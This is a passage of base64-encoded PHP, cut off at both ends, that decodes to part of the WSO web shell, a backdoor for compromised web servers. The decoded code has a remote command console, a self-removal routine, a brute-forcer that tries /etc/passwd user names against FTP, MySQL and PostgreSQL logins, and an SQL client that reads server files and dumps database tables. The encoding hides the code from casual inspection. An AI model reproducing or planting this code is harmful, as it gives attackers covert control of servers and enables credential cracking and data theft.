ZhbHVlPSI+PiI+PC9mb3JtPic7CgkJCWJyZWFrOwoJCWNhc2UgJ3RvdWNoJzoKCQkJaWYoICFlbXB0eSgkX1BPU1RbJ3AzJ10pICkgewoJCQkJJHRpbWUgPSBzdHJ0b3RpbWUoJF9QT1NUWydwMyddKTsKCQkJCWlmKCR0aW1lKSB7CgkJCQkJaWYoIXRvdWNoKCRfUE9TVFsncDEnXSwkdGltZSwkdGltZSkpCgkJCQkJCWVjaG8gJ0ZhaWwhJzsKCQkJCQllbHNlCgkJCQkJCWVjaG8gJ1RvdWNoZWQhJzsKCQkJCX0gZWxzZSBlY2hvICdCYWQgdGltZSBmb3JtYXQhJzsKCQkJfQoJCQljbGVhcnN0YXRjYWNoZSgpOwoJCQllY2hvICc8c2NyaXB0PnAzXz0iIjs8L3NjcmlwdD48Zm9ybSBvbnN1Ym1pdD0iZyhudWxsLG51bGwsXCcnIC4gdXJsZW5jb2RlKCRfUE9TVFsncDEnXSkgLiAnXCcsbnVsbCx0aGlzLnRvdWNoLnZhbHVlKTtyZXR1cm4gZmFsc2U7Ij48aW5wdXQgdHlwZT10ZXh0IG5hbWU9dG91Y2ggdmFsdWU9IicuZGF0ZSgiWS1tLWQgSDppOnMiLCBAZmlsZW10aW1lKCRfUE9TVFsncDEnXSkpLiciPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT4nOwoJCQlicmVhazsKCX0KCWVjaG8gJzwvZGl2Pic7Cgl3c29Gb290ZXIoKTsKfQoKZnVuY3Rpb24gYWN0aW9uQ29uc29sZSgpIHsKICAgIGlmKCFlbXB0eSgkX1BPU1RbJ3AxJ10pICYmICFlbXB0eSgkX1BPU1RbJ3AyJ10pKSB7CiAgICAgICAgV1NPc2V0Y29va2llKG1kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLidzdGRlcnJfdG9fb3V0JywgdHJ1ZSk7CiAgICAgICAgJF9QT1NUWydwMSddIC49ICcgMj4mMSc7CiAgICB9IGVsc2VpZighZW1wdHkoJF9QT1NUWydwMSddKSkKICAgICAgICBXU09zZXRjb29raWUobWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJ3N0ZGVycl90b19vdXQnLCAwKTsKCglpZihpc3NldCgkX1BPU1RbJ2FqYXgnXSkpIHsKCQlXU09zZXRjb29raWUobWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJ2FqYXgnLCB0cnVlKTsKCQlvYl9zdGFydCgpOwoJCWVjaG8gImQuY2YuY21kLnZhbHVlPScnO1xuIjsKCQkkdGVtcCA9IEBpY29udigkX1BPU1RbJ2NoYXJzZXQnXSwgJ1VURi04JywgYWRkY3NsYXNoZXMoIlxuJCAiLiRfUE9TVFsncDEnXS4iXG4iLndzb0V4KCRfUE9TVFsncDEnXSksIlxuXHJcdFxcJ1wwIikpOwoJCWlmKHByZWdfbWF0Y2goIiEuKmNkXHMrKFteO10rKSQhIiwkX1BPU1RbJ3AxJ10sJG1hdGNoKSkJewoJCQlpZihAY2hkaXIoJG1hdGNoWzFdKSkgewoJCQkJJEdMT0JBTFNbJ2N3ZCddID0gQGdldGN3ZCgpOwoJCQkJZWNobyAiY189JyIuJEdMT0JBTFNbJ2N3ZCddLiInOyI7CgkJCX0KCQl9CgkJZWNobyAiZC5jZi5vdXRwdXQudmFsdWUrPSciLiR0ZW1wLiInOyI7CgkJZWNobyAiZC5jZi5vdXRwdXQuc2Nyb2xsVG9wID0gZC5jZi5vdXRwdXQuc2Nyb2xsSGVpZ2h0OyI7CgkJJHRlbXAgPSBvYl9nZXRfY2xlYW4oKTsKCQllY2hvIHN0cmxlbigkdGVtcCksICJcbiIsICR0ZW1wOwoJCWV4aXQ7Cgl9CiAgICBpZihlbXB0eSgkX1BPU1RbJ2FqYXgnXSkmJiFlbXB0eSgkX1BPU1RbJ3AxJ10pKQoJCVdTT3NldGNvb2tpZShtZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nYWpheCcsIDApOwoJd3NvSGVhZGVyKCk7CiAgICBlY2hvICI8c2NyaXB0PgppZih3aW5kb3cuRXZlbnQpIHdpbmRvdy5jYXB0dXJlRXZlbnRzKEV2ZW50LktFWURPV04pOwp2YXIgY21kcyA9IG5ldyBBcnJheSgnJyk7CnZhciBjdXIgPSAwOwpmdW5jdGlvbiBrcChlKSB7Cgl2YXIgbiA9ICh3aW5kb3cuRXZlbnQpID8gZS53aGljaCA6IGUua2V5Q29kZTsKCWlmKG4gPT0gMzgpIHsKCQljdXItLTsKCQlpZihjdXI+PTApCgkJCWRvY3VtZW50LmNmLmNtZC52YWx1ZSA9IGNtZHNbY3VyXTsKCQllbHNlCgkJCWN1cisrOwoJfSBlbHNlIGlmKG4gPT0gNDApIHsKCQljdXIrKzsKCQlpZihjdXIgPCBjbWRzLmxlbmd0aCkKCQkJZG9jdW1lbnQuY2YuY21kLnZhbHVlID0gY21kc1tjdXJdOwoJCWVsc2UKCQkJY3VyLS07Cgl9Cn0KZnVuY3Rpb24gYWRkKGNtZCkgewoJY21kcy5wb3AoKTsKCWNtZHMucHVzaChjbWQpOwoJY21kcy5wdXNoKCcnKTsKCWN1ciA9IGNtZHMubGVuZ3RoLTE7Cn0KPC9zY3JpcHQ+IjsKCWVjaG8gJzxoMT5Db25zb2xlPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+PGZvcm0gbmFtZT1jZiBvbnN1Ym1pdD0iaWYoZC5jZi5jbWQudmFsdWU9PVwnY2xlYXJcJyl7ZC5jZi5vdXRwdXQudmFsdWU9XCdcJztkLmNmLmNtZC52YWx1ZT1cJ1wnO3JldHVybiBmYWxzZTt9YWRkKHRoaXMuY21kLnZhbHVlKTtpZih0aGlzLmFqYXguY2hlY2tlZCl7YShudWxsLG51bGwsdGhpcy5jbWQudmFsdWUsdGhpcy5zaG93X2Vycm9ycy5jaGVja2VkPzE6XCdcJyk7fWVsc2V7ZyhudWxsLG51bGwsdGhpcy5jbWQudmFsdWUsdGhpcy5zaG93X2Vycm9ycy5jaGVja2VkPzE6XCdcJyk7fSByZXR1cm4gZmFsc2U7Ij48c2VsZWN0IG5hbWU9YWxpYXM+JzsKCWZvcmVhY2goJEdMT0JBTFNbJ2FsaWFzZXMnXSBhcyAkbiA9PiAkdikgewoJCWlmKCR2ID09ICcnKSB7CgkJCWVjaG8gJzxvcHRncm91cCBsYWJlbD0iLScuaHRtbHNwZWNpYWxjaGFycygkbikuJy0iPjwvb3B0Z3JvdXA+JzsKCQkJY29udGludWU7CgkJfQoJCWVjaG8gJzxvcHRpb24gdmFsdWU9IicuaHRtbHNwZWNpYWxjaGFycygkdikuJyI+Jy4kbi4nPC9vcHRpb24+JzsKCX0KCgllY2hvICc8L3NlbGVjdD48aW5wdXQgdHlwZT1idXR0b24gb25jbGljaz0iYWRkKGQuY2YuYWxpYXMudmFsdWUpO2lmKGQuY2YuYWpheC5jaGVja2VkKXthKG51bGwsbnVsbCxkLmNmLmFsaWFzLnZhbHVlLGQuY2Yuc2hvd19lcnJvcnMuY2hlY2tlZD8xOlwnXCcpO31lbHNle2cobnVsbCxudWxsLGQuY2YuYWxpYXMudmFsdWUsZC5jZi5zaG93X2Vycm9ycy5jaGVja2VkPzE6XCdcJyk7fSIgdmFsdWU9Ij4+Ij4gPG5vYnI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1hamF4IHZhbHVlPTEgJy4oQCRfQ09PS0lFW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLidhamF4J10/J2NoZWNrZWQnOicnKS4nPiBzZW5kIHVzaW5nIEFKQVggPGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1zaG93X2Vycm9ycyB2YWx1ZT0xICcuKCFlbXB0eSgkX1BPU1RbJ3AyJ10pfHwkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nc3RkZXJyX3RvX291dCddPydjaGVja2VkJzonJykuJz4gcmVkaXJlY3Qgc3RkZXJyIHRvIHN0ZG91dCAoMj4mMSk8L25vYnI+PGJyLz48dGV4dGFyZWEgY2xhc3M9YmlnYXJlYSBuYW1lPW91dHB1dCBzdHlsZT0iYm9yZGVyLWJvdHRvbTowO21hcmdpbjowOyIgcmVhZG9ubHk+JzsKCWlmKCFlbXB0eSgkX1BPU1RbJ3AxJ10pKSB7CgkJZWNobyBodG1sc3BlY2lhbGNoYXJzKCIkICIuJF9QT1NUWydwMSddLiJcbiIud3NvRXgoJF9QT1NUWydwMSddKSk7Cgl9CgllY2hvICc8L3RleHRhcmVhPjx0YWJsZSBzdHlsZT0iYm9yZGVyOjFweCBzb2xpZCAjZGY1O2JhY2tncm91bmQtY29sb3I6IzU1NTtib3JkZXItdG9wOjBweDsiIGNlbGxwYWRkaW5nPTAgY2VsbHNwYWNpbmc9MCB3aWR0aD0iMTAwJSI+PHRyPjx0ZCB3aWR0aD0iMSUiPiQ8L3RkPjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9Y21kIHN0eWxlPSJib3JkZXI6MHB4O3dpZHRoOjEwMCU7IiBvbmtleWRvd249ImtwKGV2ZW50KTsiPjwvdGQ+PC90cj48L3RhYmxlPic7CgllY2hvICc8L2Zvcm0+PC9kaXY+PHNjcmlwdD5kLmNmLmNtZC5mb2N1cygpOzwvc2NyaXB0Pic7Cgl3c29Gb290ZXIoKTsKfQoKZnVuY3Rpb24gYWN0aW9uTG9nb3V0KCkgewogICAgc2V0Y29va2llKG1kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLCAnJywgdGltZSgpIC0gMzYwMCk7CglkaWUoJ2J5ZSEnKTsKfQoKZnVuY3Rpb24gYWN0aW9uU2VsZlJlbW92ZSgpIHsKCglpZigkX1BPU1RbJ3AxJ10gPT0gJ3llcycpCgkJaWYoQHVubGluayhwcmVnX3JlcGxhY2UoJyFcKFxkK1wpXHMuKiEnLCAnJywgX19GSUxFX18pKSkKCQkJZGllKCdTaGVsbCBoYXMgYmVlbiByZW1vdmVkJyk7CgkJZWxzZQoJCQllY2hvICd1bmxpbmsgZXJyb3IhJzsKICAgIGlmKCRfUE9TVFsncDEnXSAhPSAneWVzJykKICAgICAgICB3c29IZWFkZXIoKTsKCWVjaG8gJzxoMT5TdWljaWRlPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+UmVhbGx5IHdhbnQgdG8gcmVtb3ZlIHRoZSBzaGVsbD88YnI+PGEgaHJlZj0jIG9uY2xpY2s9ImcobnVsbCxudWxsLFwneWVzXCcpIj5ZZXM8L2E+PC9kaXY+JzsKCXdzb0Zvb3RlcigpOwp9CgpmdW5jdGlvbiBhY3Rpb25CcnV0ZWZvcmNlKCkgewoJd3NvSGVhZGVyKCk7CglpZiggaXNzZXQoJF9QT1NUWydwcm90byddKSApIHsKCQllY2hvICc8aDE+UmVzdWx0czwvaDE+PGRpdiBjbGFzcz1jb250ZW50PjxzcGFuPlR5cGU6PC9zcGFuPiAnLmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwcm90byddKS4nIDxzcGFuPlNlcnZlcjo8L3NwYW4+ICcuaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3NlcnZlciddKS4nPGJyPic7CgkJaWYoICRfUE9TVFsncHJvdG8nXSA9PSAnZnRwJyApIHsKCQkJZnVuY3Rpb24gd3NvQnJ1dGVGb3JjZSgkaXAsJHBvcnQsJGxvZ2luLCRwYXNzKSB7CgkJCQkkZnAgPSBAZnRwX2Nvbm5lY3QoJGlwLCAkcG9ydD8kcG9ydDoyMSk7CgkJCQlpZighJGZwKSByZXR1cm4gZmFsc2U7CgkJCQkkcmVzID0gQGZ0cF9sb2dpbigkZnAsICRsb2dpbiwgJHBhc3MpOwoJCQkJQGZ0cF9jbG9zZSgkZnApOwoJCQkJcmV0dXJuICRyZXM7CgkJCX0KCQl9IGVsc2VpZiggJF9QT1NUWydwcm90byddID09ICdteXNxbCcgKSB7CgkJCWZ1bmN0aW9uIHdzb0JydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcykgewoJCQkJJHJlcyA9IEBteXNxbF9jb25uZWN0KCRpcC4nOicuKCRwb3J0PyRwb3J0OjMzMDYpLCAkbG9naW4sICRwYXNzKTsKCQkJCUBteXNxbF9jbG9zZSgkcmVzKTsKCQkJCXJldHVybiAkcmVzOwoJCQl9CgkJfSBlbHNlaWYoICRfUE9TVFsncHJvdG8nXSA9PSAncGdzcWwnICkgewoJCQlmdW5jdGlvbiB3c29CcnV0ZUZvcmNlKCRpcCwkcG9ydCwkbG9naW4sJHBhc3MpIHsKCQkJCSRzdHIgPSAiaG9zdD0nIi4kaXAuIicgcG9ydD0nIi4kcG9ydC4iJyB1c2VyPSciLiRsb2dpbi4iJyBwYXNzd29yZD0nIi4kcGFzcy4iJyBkYm5hbWU9cG9zdGdyZXMiOwoJCQkJJHJlcyA9IEBwZ19jb25uZWN0KCRzdHIpOwoJCQkJQHBnX2Nsb3NlKCRyZXMpOwoJCQkJcmV0dXJuICRyZXM7CgkJCX0KCQl9CgkJJHN1Y2Nlc3MgPSAwOwoJCSRhdHRlbXB0cyA9IDA7CgkJJHNlcnZlciA9IGV4cGxvZGUoIjoiLCAkX1BPU1RbJ3NlcnZlciddKTsKCQlpZigkX1BPU1RbJ3R5cGUnXSA9PSAxKSB7CgkJCSR0ZW1wID0gQGZpbGUoJy9ldGMvcGFzc3dkJyk7CgkJCWlmKCBpc19hcnJheSgkdGVtcCkgKQoJCQkJZm9yZWFjaCgkdGVtcCBhcyAkbGluZSkgewoJCQkJCSRsaW5lID0gZXhwbG9kZSgiOiIsICRsaW5lKTsKCQkJCQkrKyRhdHRlbXB0czsKCQkJCQlpZiggd3NvQnJ1dGVGb3JjZShAJHNlcnZlclswXSxAJHNlcnZlclsxXSwgJGxpbmVbMF0sICRsaW5lWzBdKSApIHsKCQkJCQkJJHN1Y2Nlc3MrKzsKCQkJCQkJZWNobyAnPGI+Jy5odG1sc3BlY2lhbGNoYXJzKCRsaW5lWzBdKS4nPC9iPjonLmh0bWxzcGVjaWFsY2hhcnMoJGxpbmVbMF0pLic8YnI+JzsKCQkJCQl9CgkJCQkJaWYoQCRfUE9TVFsncmV2ZXJzZSddKSB7CgkJCQkJCSR0bXAgPSAiIjsKCQkJCQkJZm9yKCRpPXN0cmxlbigkbGluZVswXSktMTsgJGk+PTA7IC0tJGkpCgkJCQkJCQkkdG1wIC49ICRsaW5lWzBdWyRpXTsKCQkJCQkJKyskYXR0ZW1wdHM7CgkJCQkJCWlmKCB3c29CcnV0ZUZvcmNlKEAkc2VydmVyWzBdLEAkc2VydmVyWzFdLCAkbGluZVswXSwgJHRtcCkgKSB7CgkJCQkJCQkkc3VjY2VzcysrOwoJCQkJCQkJZWNobyAnPGI+Jy5odG1sc3BlY2lhbGNoYXJzKCRsaW5lWzBdKS4nPC9iPjonLmh0bWxzcGVjaWFsY2hhcnMoJHRtcCk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJfSBlbHNlaWYoJF9QT1NUWyd0eXBlJ10gPT0gMikgewoJCQkkdGVtcCA9IEBmaWxlKCRfUE9TVFsnZGljdCddKTsKCQkJaWYoIGlzX2FycmF5KCR0ZW1wKSApCgkJCQlmb3JlYWNoKCR0ZW1wIGFzICRsaW5lKSB7CgkJCQkJJGxpbmUgPSB0cmltKCRsaW5lKTsKCQkJCQkrKyRhdHRlbXB0czsKCQkJCQlpZiggd3NvQnJ1dGVGb3JjZSgkc2VydmVyWzBdLEAkc2VydmVyWzFdLCAkX1BPU1RbJ2xvZ2luJ10sICRsaW5lKSApIHsKCQkJCQkJJHN1Y2Nlc3MrKzsKCQkJCQkJZWNobyAnPGI+Jy5odG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnbG9naW4nXSkuJzwvYj46Jy5odG1sc3BlY2lhbGNoYXJzKCRsaW5lKS4nPGJyPic7CgkJCQkJfQoJCQkJfQoJCX0KCQllY2hvICI8c3Bhbj5BdHRlbXB0czo8L3NwYW4+ICRhdHRlbXB0cyA8c3Bhbj5TdWNjZXNzOjwvc3Bhbj4gJHN1Y2Nlc3M8L2Rpdj48YnI+IjsKCX0KCWVjaG8gJzxoMT5CcnV0ZWZvcmNlPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+PHRhYmxlPjxmb3JtIG1ldGhvZD1wb3N0Pjx0cj48dGQ+PHNwYW4+VHlwZTwvc3Bhbj48L3RkPicKCQkuJzx0ZD48c2VsZWN0IG5hbWU9cHJvdG8+PG9wdGlvbiB2YWx1ZT1mdHA+RlRQPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT1teXNxbD5NeVNxbDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9cGdzcWw+UG9zdGdyZVNxbDwvb3B0aW9uPjwvc2VsZWN0PjwvdGQ+PC90cj48dHI+PHRkPicKCQkuJzxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWMgdmFsdWU9IicuaHRtbHNwZWNpYWxjaGFycygkR0xPQkFMU1snY3dkJ10pLiciPicKCQkuJzxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9IicuaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2EnXSkuJyI+JwoJCS4nPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Y2hhcnNldCB2YWx1ZT0iJy5odG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnY2hhcnNldCddKS4nIj4nCgkJLic8c3Bhbj5TZXJ2ZXI6cG9ydDwvc3Bhbj48L3RkPicKCQkuJzx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c2VydmVyIHZhbHVlPSIxMjcuMC4wLjEiPjwvdGQ+PC90cj4nCgkJLic8dHI+PHRkPjxzcGFuPkJydXRlIHR5cGU8L3NwYW4+PC90ZD4nCgkJLic8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iMSIgY2hlY2tlZD4gL2V0Yy9wYXNzd2Q8L2xhYmVsPjwvdGQ+PC90cj4nCgkJLic8dHI+PHRkPjwvdGQ+PHRkPjxsYWJlbCBzdHlsZT0icGFkZGluZy1sZWZ0OjE1cHgiPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9cmV2ZXJzZSB2YWx1ZT0xIGNoZWNrZWQ+IHJldmVyc2UgKGxvZ2luIC0+IG5pZ29sKTwvbGFiZWw+PC90ZD48L3RyPicKCQkuJzx0cj48dGQ+PC90ZD48dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iMiI+IERpY3Rpb25hcnk8L2xhYmVsPjwvdGQ+PC90cj4nCgkJLic8dHI+PHRkPjwvdGQ+PHRkPjx0YWJsZSBzdHlsZT0icGFkZGluZy1sZWZ0OjE1cHgiPjx0cj48dGQ+PHNwYW4+TG9naW48L3NwYW4+PC90ZD4nCgkJLic8dGQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWxvZ2luIHZhbHVlPSJyb290Ij48L3RkPjwvdHI+JwoJCS4nPHRyPjx0ZD48c3Bhbj5EaWN0aW9uYXJ5PC9zcGFuPjwvdGQ+JwoJCS4nPHRkPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1kaWN0IHZhbHVlPSInLmh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKS4ncGFzc3dkLmRpYyI+PC90ZD48L3RyPjwvdGFibGU+JwoJCS4nPC90ZD48L3RyPjx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC90ZD48L3RyPjwvZm9ybT48L3RhYmxlPic7CgllY2hvICc8L2Rpdj48YnI+JzsKCXdzb0Zvb3RlcigpOwp9CgpmdW5jdGlvbiBhY3Rpb25TcWwoKSB7CgljbGFzcyBEYkNsYXNzIHsKCQl2YXIgJHR5cGU7CgkJdmFyICRsaW5rOwoJCXZhciAkcmVzOwoJCWZ1bmN0aW9uIERiQ2xhc3MoJHR5cGUpCXsKCQkJJHRoaXMtPnR5cGUgPSAkdHlwZTsKCQl9CgkJZnVuY3Rpb24gY29ubmVjdCgkaG9zdCwgJHVzZXIsICRwYXNzLCAkZGJuYW1lKXsKCQkJc3dpdGNoKCR0aGlzLT50eXBlKQl7CgkJCQljYXNlICdteXNxbCc6CgkJCQkJaWYoICR0aGlzLT5saW5rID0gQG15c3FsX2Nvbm5lY3QoJGhvc3QsJHVzZXIsJHBhc3MsdHJ1ZSkgKSByZXR1cm4gdHJ1ZTsKCQkJCQlicmVhazsKCQkJCWNhc2UgJ3Bnc3FsJzoKCQkJCQkkaG9zdCA9IGV4cGxvZGUoJzonLCAkaG9zdCk7CgkJCQkJaWYoISRob3N0WzFdKSAkaG9zdFsxXT01NDMyOwoJCQkJCWlmKCAkdGhpcy0+bGluayA9IEBwZ19jb25uZWN0KCJob3N0PXskaG9zdFswXX0gcG9ydD17JGhvc3RbMV19IHVzZXI9JHVzZXIgcGFzc3dvcmQ9JHBhc3MgZGJuYW1lPSRkYm5hbWUiKSApIHJldHVybiB0cnVlOwoJCQkJCWJyZWFrOwoJCQl9CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJZnVuY3Rpb24gc2VsZWN0ZGIoJGRiKSB7CgkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJewoJCQkJY2FzZSAnbXlzcWwnOgoJCQkJCWlmIChAbXlzcWxfc2VsZWN0X2RiKCRkYikpcmV0dXJuIHRydWU7CgkJCQkJYnJlYWs7CgkJCX0KCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQlmdW5jdGlvbiBxdWVyeSgkc3RyKSB7CgkJCXN3aXRjaCgkdGhpcy0+dHlwZSkgewoJCQkJY2FzZSAnbXlzcWwnOgoJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gQG15c3FsX3F1ZXJ5KCRzdHIpOwoJCQkJCWJyZWFrOwoJCQkJY2FzZSAncGdzcWwnOgoJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gQHBnX3F1ZXJ5KCR0aGlzLT5saW5rLCRzdHIpOwoJCQkJCWJyZWFrOwoJCQl9CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJZnVuY3Rpb24gZmV0Y2goKSB7CgkJCSRyZXMgPSBmdW5jX251bV9hcmdzKCk/ZnVuY19nZXRfYXJnKDApOiR0aGlzLT5yZXM7CgkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJewoJCQkJY2FzZSAnbXlzcWwnOgoJCQkJCXJldHVybiBAbXlzcWxfZmV0Y2hfYXNzb2MoJHJlcyk7CgkJCQkJYnJlYWs7CgkJCQljYXNlICdwZ3NxbCc6CgkJCQkJcmV0dXJuIEBwZ19mZXRjaF9hc3NvYygkcmVzKTsKCQkJCQlicmVhazsKCQkJfQoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCWZ1bmN0aW9uIGxpc3REYnMoKSB7CgkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJewoJCQkJY2FzZSAnbXlzcWwnOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnF1ZXJ5KCJTSE9XIGRhdGFiYXNlcyIpOwoJCQkJYnJlYWs7CgkJCQljYXNlICdwZ3NxbCc6CgkJCQkJcmV0dXJuICR0aGlzLT5yZXMgPSAkdGhpcy0+cXVlcnkoIlNFTEVDVCBkYXRuYW1lIEZST00gcGdfZGF0YWJhc2UgV0hFUkUgZGF0aXN0ZW1wbGF0ZSE9J3QnIik7CgkJCQlicmVhazsKCQkJfQoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCWZ1bmN0aW9uIGxpc3RUYWJsZXMoKSB7CgkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJewoJCQkJY2FzZSAnbXlzcWwnOgoJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gJHRoaXMtPnF1ZXJ5KCdTSE9XIFRBQkxFUycpOwoJCQkJYnJlYWs7CgkJCQljYXNlICdwZ3NxbCc6CgkJCQkJcmV0dXJuICR0aGlzLT5yZXMgPSAkdGhpcy0+cXVlcnkoInNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgIT0gJ2luZm9ybWF0aW9uX3NjaGVtYScgQU5EIHRhYmxlX3NjaGVtYSAhPSAncGdfY2F0YWxvZyciKTsKCQkJCWJyZWFrOwoJCQl9CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJZnVuY3Rpb24gZXJyb3IoKSB7CgkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJewoJCQkJY2FzZSAnbXlzcWwnOgoJCQkJCXJldHVybiBAbXlzcWxfZXJyb3IoKTsKCQkJCWJyZWFrOwoJCQkJY2FzZSAncGdzcWwnOgoJCQkJCXJldHVybiBAcGdfbGFzdF9lcnJvcigpOwoJCQkJYnJlYWs7CgkJCX0KCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQlmdW5jdGlvbiBzZXRDaGFyc2V0KCRzdHIpIHsKCQkJc3dpdGNoKCR0aGlzLT50eXBlKQl7CgkJCQljYXNlICdteXNxbCc6CgkJCQkJaWYoZnVuY3Rpb25fZXhpc3RzKCdteXNxbF9zZXRfY2hhcnNldCcpKQoJCQkJCQlyZXR1cm4gQG15c3FsX3NldF9jaGFyc2V0KCRzdHIsICR0aGlzLT5saW5rKTsKCQkJCQllbHNlCgkJCQkJCSR0aGlzLT5xdWVyeSgnU0VUIENIQVJTRVQgJy4kc3RyKTsKCQkJCQlicmVhazsKCQkJCWNhc2UgJ3Bnc3FsJzoKCQkJCQlyZXR1cm4gQHBnX3NldF9jbGllbnRfZW5jb2RpbmcoJHRoaXMtPmxpbmssICRzdHIpOwoJCQkJCWJyZWFrOwoJCQl9CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJZnVuY3Rpb24gbG9hZEZpbGUoJHN0cikgewoJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsKCQkJCWNhc2UgJ215c3FsJzoKCQkJCQlyZXR1cm4gJHRoaXMtPmZldGNoKCR0aGlzLT5xdWVyeSgiU0VMRUNUIExPQURfRklMRSgnIi5hZGRzbGFzaGVzKCRzdHIpLiInKSBhcyBmaWxlIikpOwoJCQkJYnJlYWs7CgkJCQljYXNlICdwZ3NxbCc6CgkJCQkJJHRoaXMtPnF1ZXJ5KCJDUkVBVEUgVEFCTEUgd3NvMihmaWxlIHRleHQpO0NPUFkgd3NvMiBGUk9NICciLmFkZHNsYXNoZXMoJHN0cikuIic7c2VsZWN0IGZpbGUgZnJvbSB3c28yOyIpOwoJCQkJCSRyPWFycmF5KCk7CgkJCQkJd2hpbGUoJGk9JHRoaXMtPmZldGNoKCkpCgkJCQkJCSRyW10gPSAkaVsnZmlsZSddOwoJCQkJCSR0aGlzLT5xdWVyeSgnZHJvcCB0YWJsZSB3c28yJyk7CgkJCQkJcmV0dXJuIGFycmF5KCdmaWxlJz0+aW1wbG9kZSgiXG4iLCRyKSk7CgkJCQlicmVhazsKCQkJfQoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCWZ1bmN0aW9uIGR1bXAoJHRhYmxlLCAkZnAgPSBmYWxzZSkgewoJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsKCQkJCWNhc2UgJ215c3FsJzoKCQkJCQkkcmVzID0gJHRoaXMtPnF1ZXJ5KCdTSE9XIENSRUFURSBUQUJMRSBgJy4kdGFibGUuJ2AnKTsKCQkJCQkkY3JlYXRlID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlcyk7CgkJCQkJJHNxbCA9ICRjcmVhdGVbMV0uIjtcbiI7CiAgICAgICAgICAgICAgICAgICAgaWYoJGZwKSBmd3JpdGUoJGZwLCAkc3FsKTsgZWxzZSBlY2hvKCRzcWwpOwoJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSBgJy4kdGFibGUuJ2AnKTsKICAgICAgICAgICAgICAgICAgICAkaSA9IDA7CiAgICAgICAgICAgICAgICAgICAgJGhlYWQgPSB0cnVlOwoJCQkJCXdoaWxlKCRpdGVtID0gJHRoaXMtPmZldGNoKCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICBpZigkaSAlIDEwMDAgPT0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGhlYWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9ICI7XG5cbiI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCgkJCQkJCSRjb2x1bW5zID0gYXJyYXkoKTsKCQkJCQkJZm9yZWFjaCgkaXRlbSBhcyAkaz0+JHYpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCR2ID09PSBudWxsKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtWyRrXSA9ICJOVUxMIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZihpc19pbnQoJHYpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtWyRrXSA9ICR2OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtWyRrXSA9ICInIi5AbXlzcWxfcmVhbF9lc2NhcGVfc3RyaW5nKCR2KS4iJyI7CgkJCQkJCQkkY29sdW1uc1tdID0g